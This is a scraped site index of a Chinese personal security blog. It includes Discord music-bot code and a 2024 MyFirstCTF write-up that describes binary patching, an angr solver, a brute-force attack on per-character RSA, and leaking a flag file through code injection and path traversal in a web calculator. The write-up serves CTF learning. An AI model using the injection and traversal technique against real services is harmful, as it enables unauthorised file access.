queue_urls: queue_list = \u0026#34;\\n\u0026#34;.join([f\u0026#34;{i+1}. {url}\u0026#34; for i, url in enumerate(queue_urls)]) await ctx.send(f\u0026#34;Current queue:\\n{queue_list}\u0026#34;) else: await ctx.send(\u0026#34;The queue is currently empty.\u0026#34;) @bot.command() async def s(ctx): if ctx.voice_client and ctx.voice_client.is_playing(): ctx.voice_client.stop() await ctx.send(\u0026#39;Skipped the current song.\u0026#39;) # Optionally, automatically play the next song if not queue.empty(): await play_next_song(ctx, ctx.voice_client) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) async def play_next_song(ctx, voice_client): global current_player if not queue.empty(): url = await queue.get() queue_urls.pop(0) async with ctx.typing(): try: player = await YTDLSource.from_url(url, loop=bot.loop, stream=True) current_player = player voice_client.play(player, after=lambda e: asyncio.run_coroutine_threadsafe(play_next_song(ctx, voice_client), bot.loop)) await ctx.send(f\u0026#39;正在撥放: {player.title}\u0026#39;) except Exception as e: await ctx.send(\u0026#39;error:\u0026#39;) print(e) else: await ctx.send(\u0026#39;no song\u0026#39;) bot.run(\u0026#39;你的token\u0026#39;) 反正就又卡又容易斷掉 不如乖乖下載下來\n下載到本地 #\r因為是現在還有在用ㄉ，所以加了一些功能\n基本上就自己看一下code就能知道具體功能了 這邊就不多講了 然後下載到本地的話也不是全部下載，我是設定成一次本地只會有一首歌而已，然後撥下一首的時候就把前面的刪掉，所以不用怕自己電腦被灌爆 \u0026gt;.0\nimport discord from discord.ext import commands import yt_dlp as youtube_dl import asyncio import os import datetime intents = discord.Intents.default() intents.message_content = True intents.voice_states = True bot = commands.Bot(command_prefix=\u0026#39;\u0026amp;\u0026#39;, intents=intents) ytdl_format_options = { \u0026#39;format\u0026#39;: \u0026#39;bestaudio/best\u0026#39;, \u0026#39;outtmpl\u0026#39;: \u0026#39;%(extractor)s-%(id)s-%(title)s.%(ext)s\u0026#39;, \u0026#39;restrictfilenames\u0026#39;: True, \u0026#39;noplaylist\u0026#39;: True, \u0026#39;nocheckcertificate\u0026#39;: True, \u0026#39;ignoreerrors\u0026#39;: False, \u0026#39;logtostderr\u0026#39;: False, \u0026#39;quiet\u0026#39;: True, \u0026#39;no_warnings\u0026#39;: True, \u0026#39;default_search\u0026#39;: \u0026#39;auto\u0026#39;, \u0026#39;source_address\u0026#39;: \u0026#39;0.0.0.0\u0026#39; } ffmpeg_options = { \u0026#39;options\u0026#39;: \u0026#39;-vn\u0026#39; } ytdl = youtube_dl.YoutubeDL(ytdl_format_options) class YTDLSource(discord.PCMVolumeTransformer): def __init__(self, source, *, data, volume=0.5): super().__init__(source, volume) self.data = data self.title = data.get(\u0026#39;title\u0026#39;) self.url = data.get(\u0026#39;url\u0026#39;) self.duration = data.get(\u0026#39;duration\u0026#39;) @classmethod async def from_url(cls, url, *, loop=None, stream=False): loop = loop or asyncio.get_event_loop() data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream)) if \u0026#39;entries\u0026#39; in data: data = data[\u0026#39;entries\u0026#39;][0] filename = data[\u0026#39;url\u0026#39;] if stream else ytdl.prepare_filename(data) return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data), filename queue = asyncio.Queue() queue_urls = [] current_player = None start_time = None downloaded_file = None # Only one file will be downloaded at a time @bot.event async def on_ready(): print(f\u0026#39;Logged in as {bot.user}\u0026#39;) @bot.command() async def p(ctx, url): if not ctx.message.author.voice: await ctx.send(f\u0026#34;{ctx.message.author.name} is not connected to a voice channel\u0026#34;) return channel = ctx.message.author.voice.channel if ctx.voice_client is None: voice_client = await channel.connect() else: voice_client = ctx.voice_client # Add the song to the queue await queue.put(url) queue_urls.append(url) # Get the song title to display the added message data = ytdl.extract_info(url, download=False) title = data.get(\u0026#39;title\u0026#39;, \u0026#39;Unknown title\u0026#39;) await ctx.send(f\u0026#34;已將 {title} 加入待撥清單\u0026#34;) if not voice_client.is_playing(): await play_next_song(ctx, voice_client) @bot.command() async def leave(ctx): if ctx.voice_client: await ctx.guild.voice_client.disconnect() @bot.command() async def q(ctx): if queue_urls: queue_list = [] for url in queue_urls: data = ytdl.extract_info(url, download=False) title = data.get(\u0026#39;title\u0026#39;, \u0026#39;Unknown title\u0026#39;) queue_list.append(title) queue_msg = \u0026#34;\\n\u0026#34;.join([f\u0026#34;{i+1}. {title}\u0026#34; for i, title in enumerate(queue_list)]) await ctx.send(f\u0026#34;Current queue:\\n{queue_msg}\u0026#34;) else: await ctx.send(\u0026#34;The queue is currently empty.\u0026#34;) @bot.command() async def s(ctx): if ctx.voice_client and ctx.voice_client.is_playing(): ctx.voice_client.stop() await ctx.send(\u0026#39;Skipped the current song.\u0026#39;) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) @bot.command() async def nowplay(ctx): if current_player: elapsed = (datetime.datetime.now() - start_time).total_seconds() elapsed_str = str(datetime.timedelta(seconds=int(elapsed))) duration_str = str(datetime.timedelta(seconds=int(current_player.duration))) progress_bar = create_progress_bar(elapsed, current_player.duration) await ctx.send(f\u0026#34;Now playing: {current_player.title}\\n{elapsed_str} {progress_bar} {duration_str}\u0026#34;) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) def create_progress_bar(elapsed, duration, bar_length=20): progress = elapsed / duration bar = \u0026#39;-\u0026#39; * bar_length pos = int(bar_length * progress) progress_bar = bar[:pos] + \u0026#39;o\u0026#39; + bar[pos+1:] return progress_bar @bot.command() async def stop(ctx): if ctx.voice_client: if ctx.voice_client.is_playing(): ctx.voice_client.pause() await ctx.send(\u0026#39;已暫停播放.\u0026#39;) elif ctx.voice_client.is_paused(): ctx.voice_client.resume() await ctx.send(\u0026#39;已繼續播放.\u0026#39;) else: await ctx.send(\u0026#39;沒在播歌\u0026#39;) else: await ctx.send(\u0026#39;沒在語音中\u0026#39;) async def play_next_song(ctx, voice_client): global current_player, start_time, downloaded_file if not queue.empty(): url = await queue.get() queue_urls.pop(0) async with ctx.typing(): try: # Delete the previous downloaded file if it exists if downloaded_file and os.path.isfile(downloaded_file): os.remove(downloaded_file) player, filename = await YTDLSource.from_url(url, loop=bot.loop, stream=False) current_player = player start_time = datetime.datetime.now() downloaded_file = filename # Update the downloaded file voice_client.play(player, after=lambda e: asyncio.run_coroutine_threadsafe(play_next_song(ctx, voice_client), bot.loop)) await ctx.send(f\u0026#39;正在播放: {player.title}\u0026#39;) except Exception as e: await ctx.send(\u0026#39;error:\u0026#39;) print(e) else: await ctx.send(\u0026#39;no song.\u0026#39;) bot.run(\u0026#39;你ㄉtoken\u0026#39;) # 替換為你的實際 Bot Token 運行方法 #\r其實就只要運行py檔案就好了\n看你是要在cmd中執行還是直接在編譯器(我是用vs)跑都可以\npython bot.py 與chatGPT交流 #\r夢ㄉ開始 不知道為甚麼chatGPT一開始都是用java寫的，可能因為其實普遍都是用java寫吧，但我看不懂java所以都叫他寫python(\n其實好像也沒有甚麼特別要講的，基本上就都是想要什麼功能就講甚麼\n我覺得比較好玩的大概有nowplay功能而已 就是跟他說\u0026mdash;\u0026ndash;o\u0026mdash;-來表達進度條\n大概就這樣，有甚麼問題不要DM我，去問chatGPT這都他寫的(X\n","date":"6 August 2024","externalUrl":null,"permalink":"/posts/002_discordbot/","section":"Posts","summary":"謝謝ChatGPT讓我打遊戲的時候有歌可以聽","title":"DC音樂機器人製作","type":"posts"},{"content":"","date":"6 August 2024","externalUrl":null,"permalink":"/tags/%E5%85%B6%E5%AE%83/","section":"Tags","summary":"","title":"其它","type":"tags"},{"content":"\r其實pre-exam也寫在這裡了 因為兩個沒差多少\r前言 #\r這次能打到前五真的覺得很不可思議，感覺今年題目有比較難\n雖然我也沒有打過之前的比賽就對了\n這次能打到第五名首先要特別感謝努力的自己 ，還有要特別感謝成大資安社還有B33F 50μP戰隊，提供了許多學習資源讓我學習 ，不過這次能打到那麼高真的覺得自己只是單純運氣好，比賽的時候想到比較多奇怪的方法，很多題還都是被我硬搓出來的\n而且賽後發現很多本來名次在我後面的，在pre-exam的名次都超過我了🛐\n建議想看比較正規解的人可以去看看別人的write up，我的真的都比較偏通靈向\n廢話夠多了，再來就進入到WriteUp的部分了\nScoreboard #\r先丟上自己的記分板還有賽後超長的記分板 我是MFCTF完整記分板\n我是pre-exam完整記分板\nMisc #\rWelcome #\r這次的Welcome沒有整活，單純點開題目描述就有了 flag:AIS3{Welc0me_to_AIS3_PreExam_2o24!}\n好歹也把pre-exam改成MFCTF吧 Quantum Nim Heist #\r這題是賽後在pre-exam才解出來的\r這題當初在MFCTF的時候是想說可能要先去破解他hash加密的部分\n然後自己找出把1加密後的結果再拿去讀檔\n所以MFCTF的時候想很久也沒有想出來該怎麼做\n結果賽後在pre-exam的時候無聊去亂試意外就找到破解的地方了\nsolve:\r如果一開始遊玩時亂輸入的話會顯示錯誤，因此就先正常進行遊戲動個幾步，後面直接按enter就會發現沒有報錯，而且對手也會動下一步\n因此再來就是等對手動到剩下最後一排的時候再去收割就好了 flag:AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?} Reverse #\rThe Long Print #\r先透過IDA查看反編譯後的代碼，主要可以發現在輸出的部分會重複執行sleep，因此無法直接透過執行來查看flag ，並且可以看到flag應該是存在v4也就是rsp的部分\n這邊再特別解釋一下，因為從上面反編譯後可以看到輸出後會再做V4\u0026gt;\u0026gt;=8的動作 因此這邊就是每次察看rsp的末兩位就好了 我一開始是透過gdb來在sleep的地方下斷點，然後直接jump到下一行，結果發現最後拚出來的flag怪怪的 其實這邊這個方法也可以 只是我當時看錯東西\n所以又去嘗試透過IDA先找到sleep的地方換成16進制檔案時在哪，再透過010Editor把那部分改成90，也就是不進行任何動作(這部分等等的火拳也會用到，會再詳細介紹)\nsolve:\r兩個方法其實後面要做的事情都差不多，都一樣是丟到gdb裡面，然後再printf的地方下斷點，並查看當時rsp的質，最後再轉成ASCII字元就好了 所以再來就一樣慢慢把flag搓出來 $rsp 的質: 0x3353494100000000 0x756f597b00000000 0x6572615f00000000 0x6568745f00000000 0x73616d5f00000000 0x5f72657400000000 0x745f666f00000000 0x5f656d6900000000 0x616e616d00000000 0x656d656700000000 0x2121746e00000000 0x7d3f212100000000 flag: AIS3{You_are_the_master_of_time_management!!!!?}\n火拳のエース #\r特別感謝Kazma在讀書會上分享angr這個工具 這題是透過angr來快速解出來的 Kazma的angr教學\n也沒有到秒解 還是想了很久\nsolve:\r一樣都先透過IDA查看反編譯後的代碼，發現跟之前自己練習angr官方Lab006使用到的觀念都差不多 主要都是把數據存在動態內存再去做混淆\r題目: lab006: 所以這邊直接偷Lab006的解來稍作修改\nimport angr import claripy import sys def main(argv): path_to_binary = argv[1] project = angr.Project(path_to_binary) start_address = 0x08049661 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) password0 = claripy.BVS(\u0026#39;password0\u0026#39;, 64) password1 = claripy.BVS(\u0026#39;password1\u0026#39;, 64) password2 = claripy.BVS(\u0026#39;password2\u0026#39;, 64) password3 = claripy.BVS(\u0026#39;password3\u0026#39;, 64) fake_heap_address0 = 0xffffc93c pointer_to_malloc_memory_address0 = 0x090FB2D4 initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness) fake_heap_address1 = 0xffffc94c pointer_to_malloc_memory_address1 = 0x090FB2D8 initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness) fake_heap_address2 = 0xffffc95c pointer_to_malloc_memory_address2 = 0x090FB2DC initial_state.memory.store(pointer_to_malloc_memory_address2, fake_heap_address2, endness=project.arch.memory_endness) fake_heap_address3 = 0xffffc96c pointer_to_malloc_memory_address3 = 0x090FB2E0 initial_state.memory.store(pointer_to_malloc_memory_address3, fake_heap_address3, endness=project.arch.memory_endness) initial_state.memory.store(fake_heap_address0, password0) initial_state.memory.store(fake_heap_address1, password1) initial_state.memory.store(fake_heap_address2, password2) initial_state.memory.store(fake_heap_address3, password3) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\u0026#39;Yes! I remember now, this is it!\u0026#39; in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b\u0026#39;It feels slightly wrong, but almost correct...\u0026#39; in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode() solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode() solution2 = solution_state.solver.eval(password2,cast_to=bytes).decode() solution3 = solution_state.solver.eval(password3,cast_to=bytes).decode() print (solution0,solution1,solution2,solution3) else: raise Exception(\u0026#39;Could not find the solution\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: main(sys.argv) 這邊不特別解釋angr的代碼在做什麼\n接著透過剛剛LongPrint提到的，透過16進制編輯器先把print_flag的部分刪掉，因為這邊我們直接透過strings就可以看到前半部分了 具體刪除的方法是先透過IDA在欲刪除的部分下斷點，然後開啟debug模式，接著到設定將Number of opcode bytes設成6，接著切回去就可以看到該段位於十六進制檔案中的何處了 接著就拿腳本去跑一次修改過後的檔案，發現居然錯了 後面想說那不如乾脆把與lab不同的地方(進行xor的部分)也乾脆先刪掉好了，因此重複上述操作，再去跑一次腳本，發現這次就有順利出現結果了！ 那接著就是把得到的質丟回去還有xor的檔案，接著透過gdb在進行xor後下斷點，查看xor後的質是多少 那最後flag也是順利被我搓出來了 這題大概是我這次最正規的解法了 flag:AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!} Web #\rEvil Calculator #\rsolve:\r連進去發現是一個計算機，就很普通的計算機\r接著透過burp suite攔截發送1+1過去時的封包並送到Repeater查看 接著就嘗試修改1+1的部分，我先是嘗試看看能不能單純輸出字元，或是符號之類的 發現好像不能直接輸出，那接著猜測是不是只能數字，因此這邊使用簡單的len來查看，發現可以正常輸出，因此推測只要是轉成數字輸出後就可以 接著就根據題目給的檔案，知道了flag是在前一個目錄裡面，因此就嘗試結合len、read、跟Path Traversal去讀看看，發現也可以正常執行，並且知道了flag的長度為31 再來我的想法是，一個一個讀取flag的字元，因此一樣使用read只是將len改成ord來查看該字元換成ASCII為多少，但發現會報錯\n這邊直接把報錯貼到google去看，了解原來是因為直接read後就已經是數字了，不需要再透過ord去轉 因此最後直接就把ord去掉，再次察看就會發現有正常輸出了！\n然後就重複這個操作31次 flag就被我搓出來了呢 flag:AIS3{7RiANG13_5NAK3_I5_50_3Vi1}\nCrypto #\rbabyRSA #\r這題也是被我硬搓出來的 我對不起大家\nsolve:\r這邊先查看原代碼，可以發現它應該是對flag的每個字元去做個別加密的，因此最後輸出結果才會有那麼多\r這邊我想了很久，最後決定！\n對string.printable全部做一次加密 然後慢慢把flag對照搓出來 我的方法真的很笨 自己都看不下去的那種\nimport string def encrypt(pk, plaintext): key, n = pk cipher = [pow(ord(char), key, n) for char in plaintext] return cipher public=(64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649) flag=string.printable print(flag) encrypted_msg = encrypt(public, flag) for i in range(len(flag)): print(flag[i],\u0026#34;=\u0026#34;,encrypted_msg[i]) 我是直接在記事本裡面慢慢用搜尋跟取代把flag搓出來啦，因為那個時候比賽快結束了，也懶得去想程式碼要怎麼寫，所以這邊就直接藉助了工人智慧 而且flag檔案的第一碼還不是A 害我當初困惑超久 所以後面才決定直接把全部都硬搓出來\nflag:AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}\n好欸終於寫完了\n然後如果發現我上述有錯誤的地方 都歡迎私訊我提醒我改一下\n相關問題 #\r這邊會比較偏我當初行前自己有疑惑的點，算是半個指引吧\r首先是交通的問題，這次舉辦的地點在救國團劍潭青年活動中心-集賢廳 (台北市中山北路四段16號)\n我自己是騎車過去啦，當初一直在想到底有沒有車位，後來其實發現在正門入口就有免費停車場了，而且還滿空的，因此大家可以放心騎車去了 再來是題目數量的部分，這次題目好像有比較多，以往好像都是各類型抓兩題，但這次是變成三題，不確定以後會不會也都是三題\n題目總覽 ","date":"30 June 2024","externalUrl":null,"permalink":"/posts/001_mfctf_writeup/","section":"Posts","summary":"2024ㄉMyFirstCTF跟pre-examㄉWriteUp","title":"2024 MyFirstCTF WriteUp","type":"posts"},{"content":"\r建立契機 #\r發現各大佬都有自己的網站，我也想要有一個\n當初打CTF在看別人寫的Write up就想著以後也要自己寫在部落格裡\n剛好想說可以創個地方來讓我寫各種資安相關的經歷\n因此這個網站主要內容也比較都會是以我的各種資安相關經歷為主\n網站簡介 #\r這個網站是透過\rHugo 建立，並套用了\rblowfish 主題\n然後我其實很不會寫網站 歡迎各位大神指導我\n網站歷史 #\r2024-5-27 網站創立\n","date":"31 May 2024","externalUrl":null,"permalink":"/intro/","section":"betan423.github.io","summary":"看看我ㄉ部落格歷史。","title":"網站簡介","type":"page"},{"content":"\r副標題\r段落標題 #\r換行 圖片 ","date":"23 April 2005","externalUrl":null,"permalink":"/%E9%A0%90%E8%A8%AD/","section":"betan423.github.io","summary":"複製用模板","title":"模板","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"\r看看我給未來的自己畫了多少餅\r資安相關規劃 #\r我的未來\n一 片 迷 茫\n","date":"1 January 0001","externalUrl":null,"permalink":"/future/","section":"betan423.github.io","summary":"我ㄉ未來規劃。","title":"未來規劃","type":"page"},{"content":"\n這我 #\r嗨我是貝坦，一個誤打誤撞跑去學資安的怪人\n當初對於資安這塊完全沒概念，但大學不小心上了一個名子很長的資安系， 在經過一學期的各種講座洗禮以及自己稍微了解後，發現對於資安好像滿有興趣的， 結果就栽進這個無底洞了。\n資安經驗 #\r2024-4 加入B33F 50μP戰隊\n2024-8 參與2024 AIS3\n2024-8 臺灣好厲駭第九屆\n2025-1 參加TeamT5 camp\n競賽經驗 #\r2024 My First CTF 銀質獎/第5名\n2024 AIS3 最佳專題獎\n所有奇怪經歷 #\r2024 #\r1月 #\rEOF初賽\nTSC CTF 47名\n3月 #\r線上資安人力需求對談-智慧製造產業\n網路通信產業跨域資安人力高峰論壇\npico CTF 2666/6957\n4月 #\rTHJCC CTF 14/108\n5月 #\r國際資安大會\nAIS3 Pre-Exam\nAIS3 MyFirstCTF\n6月 #\rBCACTF DownUnderCTF\n7月 #\rAIS3\n8月 #\rAIS3\nFinTech Summer CAMP 金融產業資安實務研習營\nAIS3 club\nHITCON\nNISRA enlghtened擔任pwn課程的講師\n臺灣好厲駭第9屆高階培訓\n9月 #\r神盾盃 19名\n10月 #\r金盾獎 初賽\n11月 #\rGCCG 39名\n12月 #\r2025 #\r1月 #\rTeam T5 camp\n","date":"1 January 0001","externalUrl":null,"permalink":"/authors/betan/","section":"Authors","summary":"","title":"我是貝坦betan","type":"authors"}]